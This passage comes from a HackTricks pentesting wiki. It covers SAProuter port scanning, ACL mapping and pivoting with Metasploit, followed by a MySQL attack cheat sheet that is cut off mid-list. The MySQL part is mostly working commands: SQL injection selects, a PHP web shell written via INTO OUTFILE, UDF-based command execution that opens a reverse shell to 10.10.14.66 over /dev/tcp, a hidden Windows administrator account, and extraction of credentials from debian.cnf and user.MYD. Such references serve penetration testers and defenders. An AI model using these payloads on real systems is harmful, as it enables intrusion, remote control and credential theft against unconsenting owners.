finally set PORTS with the TCP ports to scan.\nThe module provides also an INSTANCES option that allows simplifying the definition of the PORTS option. SAP installations support multiple instances, providing similar services, so each instance has assigned TCP ports. For example, SAP instance 00 will have the SAP dispatcher service (where SAP GUI connects to) on port 3200 and instance 01 on port 3201. The PORTS option supports a ‚Äúwildcard‚Äù which is ‚ÄúNN‚Äù that will be replaced with the instance number, hence scanning ports for all the defined instances. So, if we want to scan instances from 00 to 50, we can define the INSTANCES and PORTS variables this way:\nmsf auxiliary(sap_router_portscanner) > set INSTANCES 00-50\nINSTANCES => 00-01\nmsf auxiliary(sap_router_portscanner) > set PORTS 32NN\nPORTS => 32NN\nWith this setting the module will scan ports in range 3200 to 3250.\nIn the source of the module you have information regarding the common default ports on SAP systems, which we will now be using for scanning:\nmsf > use auxiliary/scanner/sap/sap_router_portscanner\nmsf auxiliary(sap_router_portscanner) > use auxiliary/scanner/sap/sap_router_portscanner\nmsf auxiliary(sap_router_portscanner) > set RHOST 1.2.3.101\nRHOST => 1.2.3.101\nmsf auxiliary(sap_router_portscanner) > set TARGETS 192.168.1.18\nTARGETS => 192.168.1.18\nmsf auxiliary(sap_router_portscanner) > set INSTANCES 00-01\nINSTANCES => 00-01\nmsf auxiliary(sap_router_portscanner) > set PORTS 32NN,33NN,48NN,80NN,36NN,81NN,5NN00-5NN19,21212,21213,59975,59976,4238-4241,3299,3298,515,7200,7210,7269,7270,7575,39NN,3909,4NN00,8200,8210,8220,8230,4363,4444,4445,9999,3NN01-3NN08,3NN11,3NN17,20003-20007,31596,31597,31602,31601,31604,2000-2002,8355,8357,8351-8353,8366,1090,1095,20201,1099,1089,443NN,444NN\nPORTS => 32NN,33NN,48NN,80NN,36NN,81NN,5NN00-5NN19,21212,21213,59975,59976,4238-4241,3299,3298,515,7200,7210,7269,7270,7575,39NN,3909,4NN00,8200,8210,8220,8230,4363,4444,4445,9999,3NN01-3NN08,3NN11,3NN17,20003-20007,31596,31597,31602,31601,31604,2000-2002,8355,8357,8351-8353,8366,1090,1095,20201,1099,1089,443NN,444NN\nmsf auxiliary(sap_router_portscanner) > run\n‚Äã\n[*] Scanning 192.168.1.18\n[!] Warning: Service info could be inaccurate\n‚Äã\nPortscan Results\n================\n‚Äã\nHost           Port   State   Info\n----           ----   -----   ----\n192.168.1.18   3201   closed  SAP Dispatcher sapdp01\n192.168.1.18   3200   open    SAP Dispatcher sapdp00\n192.168.1.18   50013  open    SAP StartService [SOAP] sapctrl00\n‚Äã\n[*] Auxiliary module execution completed\nWe can try to understand why some connections are not allowed through the saprouter by using the VERBOSE option. When VERBOSE is set to true we are able to see the response from the saprouter, and map the defined ACL.\nWe will now scan the 192.168.1.18 and the 192.168.1.1 hosts, but only on port 3200, to see if we can connect to both SAP dispatchers:\nmsf auxiliary(sap_router_portscanner) > set VERBOSE true\nVERBOSE => true\nmsf auxiliary(sap_router_portscanner) > set TARGETS 192.168.1.1,192.168.1.18\nTARGETS => 192.168.1.1,192.168.1.18\nmsf auxiliary(sap_router_portscanner) > set PORTS 32NN\nPORTS => 32NN\nmsf auxiliary(sap_router_portscanner) > run\n‚Äã\n[*] Scanning 192.168.1.18\n[+] 192.168.1.18:3200 - TCP OPEN\n[!] Warning: Service info could be inaccurate\n‚Äã\nPortscan Results\n================\n‚Äã\nHost          Port  State   Info\n----          ----  -----   ----\n192.168.1.18  3200  open  SAP Dispatcher sapdp00\n‚Äã\n[*] Scanning 192.168.1.1\n[-] 192.168.1.1:3200 - blocked by ACL\n[!] Warning: Service info could be inaccurate\n[*] Auxiliary module execution completed\nAs you can see, we now also know that we cannot connect to other host on port 3200, since it is blocked by the ACL defined on the saprouter.\nMapping the ACLs\nAn interesting thing about the saprouter, is that it supports two types of connections:\nNative ‚Äì These connections are simply TCP connections;\nSAP protocol ‚Äì These are TCP connections with a twist, the protocol states that all messages are started with 4 bytes stating the length of the following content.\nThe SAP protocol is specific to saprouter, and is what the SAP GUI uses to connect to the SAP DIAG port through the saprouter. The native protocol is used for allowing other types of connections to pass through saprouter.\nThis module allows for specifying which type of connection to test during the scan in the MODE option. The default is the SAP protocol, which is the most probable to be used in production. However, it is not uncommon to find other services allowed through the saprouter, where the ACL will allow native (TCP) connections through.\nWe can set the MODE to TCP in order to assess whether this type of connections are allowed. We will now scan the internal hosts, both on port 3200 (SAP DIAG) and 80 (HTTP), with VERBOSE set to true, on both instances 00 and 01 and see what happens:\nmsf auxiliary(sap_router_portscanner) > set MODE TCP\nMODE => TCP\n‚Äã\nmsf auxiliary(sap_router_portscanner) > set PORTS 80,32NN\nPORTS => 80,32NN\nmsf auxiliary(sap_router_portscanner) > set INSTANCES 00-01\nINSTANCES => 00-01\nmsf auxiliary(sap_router_portscanner) > run\n‚Äã\n[*] Scanning 192.168.1.18\n[+] 192.168.1.18:80 - TCP OPEN\n[-] 192.168.1.18:3200 - blocked by ACL\n[+] 192.168.1.18:3201 - TCP OPEN\n[!] Warning: Service info could be inaccurate\n‚Äã\nPortscan Results\n================\n‚Äã\nHost          Port  State  Info\n----          ----  -----  ----\n192.168.1.18  80    open\n192.168.1.18  3201  open   SAP Dispatcher sapdp01\n‚Äã\n[*] Scanning 192.168.1.1\n[-] 192.168.1.1:3200 - blocked by ACL\n[+] 192.168.1.1:3201 - TCP OPEN\n[+] 192.168.1.1:80 - TCP OPEN\n[!] Warning: Service info could be inaccurate\n‚Äã\nPortscan Results\n================\n‚Äã\nHost         Port  State  Info\n----         ----  -----  ----\n192.168.1.1  3201  open   SAP Dispatcher sapdp01\n192.168.1.1  80    open\n‚Äã\n[*] Auxiliary module execution completed\nFrom the output and the previous information we now know that the ACL is something like this:\nAllow TCP connections from any host to 192.168.1.1 to port 80\nAllow TCP connections from any host to 192.168.1.18 to port 80\nAllow TCP connections from any host to 192.168.1.1 to port 3201\nAllow TCP connections from any host to 192.168.1.18 to port 3201\nAllow SAP connections from any host to 192.168.1.18 to port 3200\nBlind enumeration of internal hosts\nIf you recall, we started by obtaining information from the saprouter which allowed us to know the IP address on an internal host, and we went on from there. But what if the saprouter doesn't provide us with that information?\nOne option is to just start scanning private address spaces, and see what happens. The other is to blindly enumerate hosts by hostname.\nSaprouters are able to resolve hostnames we request it to connect to. Saprouter is also kind enough to let us know what are the errors when it fails to connect (you can actually see the raw responses by uncommenting line 242 on the module source).\nWith this feature we are able to enumerate internal hosts by hostname, and try to go directly for the gold!\nFor this, we need to set the RESOLVE option to ‚Äúremote‚Äù. In this case, the module will request connection to the TARGETS defined, without resolving them locally, and we can try to guess the internal hosts, and eventually connect to them without ever knowing their IP addresses.\nImportant things to remember when blindly enumerating hosts:\nSet VERBOSE to true;\nWe'll get more information from saprouter if MODE is set to SAP_PROTO;\nIt is enough to set only one port to scan, since we're only interested at this point in the information sent by the saprouter (try 3200);\nResults will vary depending on the configured ACL. Unfortunately blocked connections won't give us much info.\nIn this example we'll try the hostnames sap, sapsrv and sapsrv2.\nmsf auxiliary(sap_router_portscanner) > set RESOLVE remote\nRESOLVE => remote\nmsf auxiliary(sap_router_portscanner) > set MODE SAP_PROTO\nMODE => SAP_PROTO\nmsf auxiliary(sap_router_portscanner) > set VERBOSE true\nVERBOSE => true\nmsf auxiliary(sap_router_portscanner) > set TARGETS sap,sapsrv,sapsrv2\nTARGETS => sap,sapsrv,sapsrv2\nmsf auxiliary(sap_router_portscanner) > set PORTS 3200\nPORTS => 3200\nmsf auxiliary(sap_router_portscanner) > run\n‚Äã\n[*] Scanning sap\n[-] sap:3200 - unknown host\n[!] Warning: Service info could be inaccurate\n[*] Scanning sapsrv\n[-] sapsrv:3200 - host unreachable\n[!] Warning: Service info could be inaccurate\n[*] Scanning sapsrv2\n[+] sapsrv2:3200 - TCP OPEN\n[!] Warning: Service info could be inaccurate\n‚Äã\nPortscan Results\n================\n‚Äã\nHost     Port  State  Info\n----     ----  -----  ----\nsapsrv2  3200  open   SAP Dispatcher sapdp00\n‚Äã\n[*] Auxiliary module execution completed\nFrom the output we see that the host ‚Äúsap‚Äù does not exist, but that host sapsrv does, although it is unreachable, and sapsrv2 exists and we can connect to port 3200.\nThis technique can also be used to try to find other hosts on the network, not SAP related, just try using common hostnames, like smtp, exchange, pdc, bdc, fileshare, intranet, or what other nice hostnames you might have on your bag of tricks\nThe last mile\nNow that we have obtained all this information, we know the internal hosts available, what services are allowed, and what protocols we can use to pierce the saprouter, we can actually connect to internal servers, and proceed with our pentest.\nMetasploit provides us with an awesome way to saprouter as a proxy, using the Proxies option, thanks to Dave Hartley (\n@nmonkee\n).\nSo at this point, we want to start gathering information on the internal sap server we have discovered in host 192.168.1.18. As an example, we'll be using the module\nsap_hostctrl_getcomputersystem\nwhich exploits CVE-2013-3319 and give us details on the OS the server is running on by querying the SAP Host Control service on port 1128 via an unauthenticated SOAP request. We'll be pivoting through the saprouter, using the proxy support in metasploit:\nmsf auxiliary(sap_router_portscanner) > use auxiliary/scanner/sap/sap_hostctrl_getcomputersystem\nmsf auxiliary(sap_hostctrl_getcomputersystem) > set Proxies sapni:1.2.3.101:3299\nProxies => sapni:1.2.3.101:3299\nmsf auxiliary(sap_hostctrl_getcomputersystem) > set RHOSTS 192.168.1.18\nRHOSTS => 192.168.1.18\nmsf auxiliary(sap_hostctrl_getcomputersystem) > run\n‚Äã\n[+] 192.168.1.18:1128 - Information retrieved successfully\n[*] 192.168.1.18:1128 - Response stored in /Users/msfusr/.msf4/loot/20140107180827_default_192.168.1.18_sap.getcomputers_386124.xml (XML) and /Users/msfusr/.msf4/loot/20140107180827_default_192.168.1.18_sap.getcomputers_186948.txt (TXT)\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nIf all went well, you'll have a nice output of the module in the loot containing interesting internal information from the target SAP host (such as internal usernames you can then try to brute force ).\nPivoting can (and should!) be used to run other modules against internal hosts, not only SAP systems!\nConclusion\nWe've seen how it is possible to exploit weak saprouter configurations that can allow access to internal hosts all the way from the Internet, all this using only metasploit's support for pentesting SAP systems.\nI hope this article can help shed light on both the risks associated with saprouter deployments, as well as SAP security in general.\nReferences\n‚Äã\nhttp://labs.mwrinfosecurity.com/blog/2012/09/13/sap-smashing-internet-windows/\n‚Äã\n[\nhttp://conference.hitb.org/hitbsecconf2010ams/materials/D2T2\n- Mariano Nun ez Di Croce - SAProuter .pdf](\nhttp://conference.hitb.org/hitbsecconf2010ams/materials/D2T2\n- Mariano Nunez Di Croce - SAProuter .pdf)\n‚Äã\nhttp://scn.sap.com/docs/DOC-17124\n‚Äã\n‚Äã\nhttp://help.sap.com/saphelp_nw70/helpdata/EN/4f/992dfe446d11d189700000e8322d00/f rameset.htm\n‚Äã\n‚Äã\nhttp://help.sap.com/saphelp_dimp50/helpdata/En/f8/bb960899d743378ccb8372215bb767 /content.htm\n‚Äã\n‚Äã\nhttp://labs.integrity.pt/advisories/cve-2013-3319/\n‚Äã\n‚Äã\nSAP Service Discovery | Rapid7\n‚Äã\n‚Äã\nSAPRouter Admin Request | Rapid7\n‚Äã\n‚Äã\nCVE-2013-3319 SAP Host Agent Information Disclosure | Rapid7\n‚Äã\n‚Äã\nSAPRouter Port Scanner | Rapid7\n‚Äã\nShodan\nport:3299 !HTTP Network packet too big\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n3260 - Pentesting ISCSI\nNext\n- Network Services Pentesting\n3306 - Pentesting Mysql\nLast modified\n6mo ago"
    },
    {
        "title": "3306 - Pentesting Mysql",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql",
        "text": "3306 - Pentesting Mysql\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n‚Äã\nRootedCON\nis the most relevant cybersecurity event in\nSpain\nand one of the most important in\nEurope\n. With\nthe mission of promoting technical knowledge\n, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.\nRootedCON\nRootedCON\nBasic Information\nMySQL\nis a freely available open source Relational Database Management System (RDBMS) that uses Structured Query Language (\nSQL\n). From\nhere\n.\nDefault port:\n3306\n3306/tcp open  mysql\nConnect\nLocal\nmysql\n-u\nroot\n# Connect to root without password\nmysql\n-u\nroot\n-p\n# A password will be asked (check someone)\nRemote\nmysql\n-h\n<\nHostname\n>\n-u\nroot\nmysql\n-h\n<\nHostname\n>\n-u\nroot@localhost\nExternal Enumeration\nSome of the enumeration actions require valid credentials\nnmap\n-sV\n-p\n3306\n--script\nmysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122\n<\nIP\n>\nmsf\n>\nuse auxiliary/scanner/mysql/mysql_version\nmsf\n>\nuse auxiliary/scanner/mysql/mysql_authbypass_hashdump\nmsf\n>\nuse auxiliary/scanner/mysql/mysql_hashdump\n#Creds\nmsf\n>\nuse auxiliary/admin/mysql/mysql_enum\n#Creds\nmsf\n>\nuse auxiliary/scanner/mysql/mysql_schemadump\n#Creds\nmsf\n>\nuse exploit/windows/mysql/mysql_start_up\n#Execute commands Windows, Creds\n‚Äã\nBrute force\n‚Äã\nWrite any binary data\nCONVERT\n(\nunhex\n(\n\"6f6e2e786d6c55540900037748b75c7249b75\"\n)\n, BINARY\n)\nCONVERT\n(\nfrom_base64\n(\n\"aG9sYWFhCg==\"\n)\n, BINARY\n)\nMySQL commands\nshow databases\n;\nuse\n<\ndatabase\n>\n;\nconnect\n<\ndatabase\n>\n;\nshow tables\n;\ndescribe\n<\ntable_name\n>\n;\nshow columns from\n<\ntable\n>\n;\n‚Äã\nselect\nversion\n();\n#version\nselect\n@@version\n();\n#version\nselect\nuser\n();\n#User\nselect\ndatabase\n();\n#database name\n‚Äã\n#Get a shell with the mysql client user\n\\\n!\nsh\n‚Äã\n#Basic MySQLi\nUnion Select\n1,2\n,3,4,group_concat\n(\n0x7c,table_name,0x7C\n)\nfrom information_schema.tables\nUnion Select\n1,2\n,3,4,column_name from information_schema.columns where\ntable_name\n=\n\"<TABLE NAME>\"\n‚Äã\n#Read & Write\n## Yo need FILE privilege to read & write to files.\nselect\nload_file\n(\n'/var/lib/mysql-files/key.txt'\n);\n#Read file\nselect\n1,2\n,\n\"<?php echo shell_exec(\n$_GET\n['c']);?>\"\n,4 into OUTFILE\n'C:/xampp/htdocs/back.php'\n‚Äã\n#Try to change MySQL root password\nUPDATE mysql.user SET\nPassword\n=\nPASSWORD\n(\n'MyNewPass'\n)\nWHERE\nUser\n=\n'root'\n;\nUPDATE mysql.user SET\nauthentication_string\n=\nPASSWORD\n(\n'MyNewPass'\n)\nWHERE\nUser\n=\n'root'\n;\nFLUSH PRIVILEGES\n;\nquit\n;\nmysql\n-u\nusername\n-p\n<\nmanycommands.sql\n#A file with all the commands you want to execute\nmysql\n-u\nroot\n-h\n127.0\n.0.1\n-e\n'show databases;'\nMySQL Permissions Enumeration\n#Mysql\nSHOW\nGRANTS\n[\nFOR\nuser\n];\nSHOW\nGRANTS\n;\nSHOW\nGRANTS\nFOR\n'root'\n@'localhost'\n;\nSHOW\nGRANTS\nFOR\nCURRENT_USER\n();\n‚Äã\n# Get users, permissions & hashes\nSELECT\n*\nFROM\nmysql\n.\nuser\n;\n‚Äã\n#From DB\nselect\n*\nfrom\nmysql\n.\nuser\nwhere\nuser\n=\n'root'\n;\n## Get users with file_priv\nselect\nuser\n,\nfile_priv\nfrom\nmysql\n.\nuser\nwhere\nfile_priv\n=\n'Y'\n;\n## Get users with Super_priv\nselect\nuser\n,\nSuper_priv\nfrom\nmysql\n.\nuser\nwhere\nSuper_priv\n=\n'Y'\n;\n‚Äã\n# List functions\nSELECT\nroutine_name\nFROM\ninformation_schema\n.\nroutines\nWHERE\nroutine_type\n=\n'FUNCTION'\n;\n#@ Functions not from sys. db\nSELECT\nroutine_name\nFROM\ninformation_schema\n.\nroutines\nWHERE\nroutine_type\n=\n'FUNCTION'\nAND\nroutine_schema\n!=\n'sys'\n;\nYou can see in the docs the meaning of each privilege:\nhttps://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html\n‚Äã\nMySQL File RCE\nMySQL File priv to SSRF/RCE\nMySQL arbitrary read file by client\nActually, when you try to\nload data local into a table\nthe\ncontent of a file\nthe MySQL or MariaDB server asks the\nclient to read it\nand send the content.\nThen, if you can tamper a mysql client to connect to your own MySQL server, you can read arbitrary files.\nPlease notice that this is the behaviour using:\nload data\nlocal\ninfile\n\"/etc/passwd\"\ninto table\ntest\nFIELDS TERMINATED BY\n'\\n'\n;\n(Notice the \"local\" word)\nBecause without the \"local\" you can get:\nmysql\n>\nload data infile\n\"/etc/passwd\"\ninto table\ntest\nFIELDS TERMINATED BY\n'\\n'\n;\n‚Äã\nERROR\n1290\n(\nHY000\n)\n: The MySQL server is running with the --secure-file-priv option so it cannot execute this statement\nInitial PoC:\nhttps://github.com/allyshka/Rogue-MySql-Server\nIn this paper you can see a complete description of the attack and even how to extend it to RCE:\nhttps://paper.seebug.org/1113/\nHere you can find an overview of the attack:\nhttp://russiansecurity.expert/2016/04/20/mysql-connect-file-read/\n‚Äã\n‚Äã\n‚Äã‚Äã\nRootedCON\nis the most relevant cybersecurity event in\nSpain\nand one of the most important in\nEurope\n. With\nthe mission of promoting technical knowledge\n, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.\nRootedCON\nRootedCON\nPOST\nMysql User\nIt will be very interesting if mysql is running as\nroot\n:\ncat\n/etc/mysql/mysql.conf.d/mysqld.cnf\n|\ngrep\n-v\n\"#\"\n|\ngrep\n\"user\"\nsystemctl status mysql\n2\n>\n/dev/null\n|\ngrep\n-o\n\".\\{0,0\\}user.\\{0,50\\}\"\n|\ncut\n-d\n'='\n-f2\n|\ncut\n-d\n' '\n-f1\nDangerous Settings of mysqld.cnf\nFrom\nhttps://academy.hackthebox.com/module/112/section/1238\n‚Äã\nSettings\nDescription\nuser\nSets which user the MySQL service will run as.\npassword\nSets the password for the MySQL user.\nadmin_address\nThe IP address on which to listen for TCP/IP connections on the administrative network interface.\ndebug\nThis variable indicates the current debugging settings (sensitive info inside logs)\nsql_warnings\nThis variable controls whether single-row INSERT statements produce an information string if warnings occur. (sensitive info inside logs)\nsecure_file_priv\nThis variable is used to limit the effect of data import and export operations.\nPrivilege escalation\n# Get current user (an all users) privileges and hashes\nuse mysql\n;\nselect\nuser\n();\nselect\nuser,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user\n;\n‚Äã\n# Get users, permissions & creds\nSELECT * FROM mysql.user\n;\nmysql\n-u\nroot\n--password\n=<\nPASSWORD\n>\n-e\n\"SELECT * FROM mysql.user;\"\n‚Äã\n# Create user and give privileges\ncreate user\ntest\nidentified by\n'test'\n;\ngrant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by\n'mysql'\nWITH GRANT OPTION\n;\n‚Äã\n# Get a shell (with your permissions, usefull for sudo/suid privesc)\n\\\n!\nsh\nPrivilege Escalation via library\nIf the\nmysql server is running as root\n(or a different more privileged user) you can make it execute commands. For that, you need to use\nuser defined functions\n. And to create a user defined you will need a\nlibrary\nfor the OS that is running mysql.\nThe malicious library to use can be found inside sqlmap and inside metasploit by doing\nlocate \"*lib_mysqludf_sys*\"\n. The\n.so\nfiles are\nlinux\nlibraries and the\n.dll\nare the\nWindows\nones, choose the one you need.\nIf you\ndon't have\nthose libraries, you can either\nlook for them\n, or download this\nlinux C code\nand\ncompile it inside the linux vulnerable machine\n:\ngcc\n-g\n-c\nraptor_udf2.c\ngcc\n-g\n-shared\n-Wl,-soname,raptor_udf2.so\n-o\nraptor_udf2.so raptor_udf2.o\n-lc\nNow that you have the library, login inside the Mysql as a privileged user (root?) and follow the next steps:\nLinux\n# Use a database\nuse\nmysql\n;\n# Create a table to load the library and move it to the plugins dir\ncreate\ntable\nnpn\n(\nline\nblob\n);\n# Load the binary library inside the table\n## You might need to change the path and file name\ninsert\ninto\nnpn\nvalues\n(\nload_file\n(\n'/tmp/lib_mysqludf_sys.so'\n));\n# Get the plugin_dir path\nshow\nvariables\nlike\n'%plugin%'\n;\n# Supposing the plugin dir was /usr/lib/x86_64-linux-gnu/mariadb19/plugin/\n# dump in there the library\nselect\n*\nfrom\nnpn\ninto\ndumpfile\n'/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys.so'\n;\n# Create a function to execute commands\ncreate\nfunction\nsys_exec\nreturns\ninteger\nsoname\n'lib_mysqludf_sys.so'\n;\n# Execute commands\nselect\nsys_exec\n(\n'id > /tmp/out.txt; chmod 777 /tmp/out.txt'\n);\nselect\nsys_exec\n(\n'bash -c \"bash -i >& /dev/tcp/10.10.14.66/1234 0>&1\"'\n);\nWindows\n# CHech the linux comments for more indications\nUSE\nmysql\n;\nCREATE\nTABLE\nnpn\n(\nline\nblob\n);\nINSERT\nINTO\nnpn\nvalues\n(\nload_file\n(\n'C://temp//lib_mysqludf_sys.dll'\n));\nshow\nvariables\nlike\n'%plugin%'\n;\nSELECT\n*\nFROM\nmysql\n.\nnpn\nINTO\nDUMPFILE\n'c://windows//system32//lib_mysqludf_sys_32.dll'\n;\nCREATE\nFUNCTION\nsys_exec\nRETURNS\ninteger\nSONAME\n'lib_mysqludf_sys_32.dll'\n;\nSELECT\nsys_exec\n(\n\"net user npn npn12345678 /add\"\n);\nSELECT\nsys_exec\n(\n\"net localgroup Administrators npn /add\"\n);\nExtracting MySQL credentials from files\nInside\n/etc/mysql/debian.cnf\nyou can find the\nplain-text password\nof the user\ndebian-sys-maint\ncat\n/etc/mysql/debian.cnf\nYou can\nuse these credentials to login in the mysql database\n.\nInside the file:\n/var/lib/mysql/mysql/user.MYD\nyou can find\nall the hashes of the MySQL users\n(the ones that you can extract from mysql.user inside the database)\n.\nYou can extract them doing:\ngrep\n-oaE\n\"[-_\\.\\*a-Z0-9]{3,}\"\n/var/lib/mysql/mysql/user.MYD\n|\ngrep\n-v\n\"mysql_native_password\"\nEnabling logging\nYou can enable logging of mysql queries inside\n/etc/mysql/my.cnf\nuncommenting the following lines:\nUseful files\nConfiguration Files\nwindows *\nconfig.ini\nmy.ini\nwindows\\my.ini\nwinnt\\my.ini\n<InstDir>/mysql/data/\nunix\nmy.cnf\n/etc/my.cnf\n/etc/mysql/my.cnf\n/var/lib/mysql/my.cnf\n~/.my.cnf\n/etc/my.cnf\nCommand History\n~/.mysql.history\nLog Files\nconnections.log\nupdate.log\ncommon.log\nDefault MySQL Database/Tables\ninformation_schema\nmysql\nperformance_schema\nsys\nALL_PLUGINS\nAPPLICABLE_ROLES\nCHARACTER_SETS\nCHECK_CONSTRAINTS\nCOLLATIONS\nCOLLATION_CHARACTER_SET_APPLICABILITY\nCOLUMNS\nCOLUMN_PRIVILEGES\nENABLED_ROLES\nENGINES\nEVENTS\nFILES\nGLOBAL_STATUS\nGLOBAL_VARIABLES\nKEY_COLUMN_USAGE\nKEY_CACHES\nOPTIMIZER_TRACE\nPARAMETERS\nPARTITIONS\nPLUGINS\nPROCESSLIST\nPROFILING\nREFERENTIAL_CONSTRAINTS\nROUTINES\nSCHEMATA\nSCHEMA_PRIVILEGES\nSESSION_STATUS\nSESSION_VARIABLES\nSTATISTICS\nSYSTEM_VARIABLES\nTABLES\nTABLESPACES\nTABLE_CONSTRAINTS\nTABLE_PRIVILEGES\nTRIGGERS\nUSER_PRIVILEGES\nVIEWS\nINNODB_LOCKS\nINNODB_TRX\nINNODB_SYS_DATAFILES\nINNODB_FT_CONFIG\nINNODB_SYS_VIRTUAL\nINNODB_CMP\nINNODB_FT_BEING_DELETED\nINNODB_CMP_RESET\nINNODB_CMP_PER_INDEX\nINNODB_CMPMEM_RESET\nINNODB_FT_DELETED\nINNODB_BUFFER_PAGE_LRU\nINNODB_LOCK_WAITS\nINNODB_TEMP_TABLE_INFO\nINNODB_SYS_INDEXES\nINNODB_SYS_TABLES\nINNODB_SYS_FIELDS\nINNODB_CMP_PER_INDEX_RESET\nINNODB_BUFFER_PAGE\nINNODB_FT_DEFAULT_STOPWORD\nINNODB_FT_INDEX_TABLE\nINNODB_FT_INDEX_CACHE\nINNODB_SYS_TABLESPACES\nINNODB_METRICS\nINNODB_SYS_FOREIGN_COLS\nINNODB_CMPMEM\nINNODB_BUFFER_POOL_STATS\nINNODB_SYS_COLUMNS\nINNODB_SYS_FOREIGN\nINNODB_SYS_TABLESTATS\nGEOMETRY_COLUMNS\nSPATIAL_REF_SYS\nCLIENT_STATISTICS\nINDEX_STATISTICS\nUSER_STATISTICS\nINNODB_MUTEXES\nTABLE_STATISTICS\nINNODB_TABLESPACES_ENCRYPTION\nuser_variables\nINNODB_TABLESPACES_SCRUBBING\nINNODB_SYS_SEMAPHORE_WAITS\ncolumns_priv\ncolumn_stats\ndb\nengine_cost\nevent\nfunc\ngeneral_log\ngtid_executed\ngtid_slave_pos\nhelp_category\nhelp_keyword\nhelp_relation\nhelp_topic\nhost\nindex_stats\ninnodb_index_stats\ninnodb_table_stats\nndb_binlog_index\nplugin\nproc\nprocs_priv\nproxies_priv\nroles_mapping\nserver_cost\nservers\nslave_master_info\nslave_relay_log_info\nslave_worker_info\nslow_log\ntables_priv\ntable_stats\ntime_zone\ntime_zone_leap_second\ntime_zone_name\ntime_zone_transition\ntime_zone_transition_type\ntransaction_registry\nuser\naccounts\ncond_instances\nevents_stages_current\nevents_stages_history\nevents_stages_history_long\nevents_stages_summary_by_account_by_event_name\nevents_stages_summary_by_host_by_event_name\nevents_stages_summary_by_thread_by_event_name\nevents_stages_summary_by_user_by_event_name\nevents_stages_summary_global_by_event_name\nevents_statements_current\nevents_statements_history\nevents_statements_history_long\nevents_statements_summary_by_account_by_event_name\nevents_statements_summary_by_digest\nevents_statements_summary_by_host_by_event_name\nevents_statements_summary_by_program\nevents_statements_summary_by_thread_by_event_name\nevents_statements_summary_by_user_by_event_name\nevents_statements_summary_global_by_event_name\nevents_transactions_current\nevents_transactions_history\nevents_transactions_history_long\nevents_transactions_summary_by_account_by_event_name\nevents_transactions_summary_by_host_by_event_name\nevents_transactions_summary_by_thread_by_event_name\nevents_transactions_summary_by_user_by_event_name\nevents_transactions_summary_global_by_event_name\nevents_waits_current\nevents_waits_history\nevents_waits_history_long\nevents_waits_summary_by_account_by_event_name\nevents_waits_summary_by_host_by_event_name\nevents_waits_summary_by_instance\nevents_waits_summary_by_thread_by_event_name\nevents_waits_summary_by_user_by_event_name\nevents_waits_summary_global_by_event_name\nfile_instances\nfile_summary_by_event_name\nfile_summary_by_instance\nglobal_status\nglobal_variables\nhost_cache\nhosts\nmemory_summary_by_account_by_event_name\nmemory_summary_by_host_by_event_name\nmemory_summary_by_thread_by_event_name\nmemory_summary_by_user_by_event_name\nmemory_summary_global_by_event_name\nmetadata_locks\nmutex_instances\nobjects_summary_global_by_type\nperformance_timers\nprepared_statements_instances\nreplication_applier_configuration\nreplication_applier_status\nreplication_applier_status_by_coordinator\nreplication_applier_status_by_worker\nreplication_connection_configuration\nreplication_connection_status\nreplication_group_member_stats\nreplication_group_members\nrwlock_instances\nsession_account_connect_attrs\nsession_connect_attrs\nsession_status\nsession_variables\nsetup_actors\nsetup_consumers\nsetup_instruments\nsetup_objects\nsetup_timers\nsocket_instances\nsocket_summary_by_event_name\nsocket_summary_by_instance\nstatus_by_account\nstatus_by_host\nstatus_by_thread\nstatus_by_user\ntable_handles\ntable_io_waits_summary_by_index_usage\ntable_io_waits_summary_by_table\ntable_lock_waits_summary_by_table\nthreads\nuser_variables_by_thread\nusers\nvariables_by_thread\nhost_summary\nhost_summary_by_file_io\nhost_summary_by_file_io_type\nhost_summary_by_stages\nhost_summary_by_statement_latency\nhost_summary_by_statement_type\ninnodb_buffer_stats_by_schema\ninnodb_buffer_stats_by_table\ninnodb_lock_waits\nio_by_thread_by_latency\nio_global_by_file_by_bytes\nio_global_by_file_by_latency\nio_global_by_wait_by_bytes\nio_global_by_wait_by_latency\nlatest_file_io\nmemory_by_host_by_current_bytes\nmemory_by_thread_by_current_bytes\nmemory_by_user_by_current_bytes\nmemory_global_by_current_bytes\nmemory_global_total\nmetrics\nprocesslist\nps_check_lost_instrumentation\nschema_auto_increment_columns\nschema_index_statistics\nschema_object_overview\nschema_redundant_indexes\nschema_table_lock_waits\nschema_table_statistics\nschema_table_statistics_with_bu